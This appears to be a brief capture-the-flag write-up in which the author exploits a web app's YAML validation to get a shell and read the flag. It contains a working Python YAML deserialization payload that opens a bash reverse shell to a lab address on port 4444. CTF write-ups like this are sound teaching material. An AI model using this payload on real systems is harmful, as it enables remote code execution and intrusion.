I learnt that the webapp was validating yaml, and so I tried to carry out a deserialization attack.

I added a new line and entered the [following code](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/python-yaml-privilege-escalation) (found by my teammate) while listening on port `4444`:

```yaml
user_input: !!python/object/new:os.system ['bash -c "bash -i >& /dev/tcp/10.200.3.4/4444 0>&1"']
```


And I was in!! After that, I just catt'd the flag.
